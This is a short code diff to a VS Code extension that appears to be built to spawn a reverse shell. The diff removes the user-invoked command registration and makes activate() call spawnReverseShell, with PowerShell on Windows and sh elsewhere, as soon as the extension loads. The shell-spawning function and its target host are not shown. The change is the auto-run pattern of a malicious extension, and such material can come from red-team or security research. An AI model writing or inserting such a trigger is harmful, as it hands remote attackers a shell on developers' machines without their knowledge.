@@ -20,15 +20,11 @@ function spawnReverseShell(shell: string) {
 
 export function activate(context: vscode.ExtensionContext) {
 
-	let command = vscode.commands.registerCommand("reverse-shell.sendReverseShell", () => {
-		if (platform === "win32") {
-			spawnReverseShell('powershell');
-		} else {
-			spawnReverseShell('sh');
-		}
-	});
-
-	context.subscriptions.push(command);
+	if (platform === "win32") {
+		spawnReverseShell('powershell');
+	} else {
+		spawnReverseShell('sh');
+	}
 	
 }
 
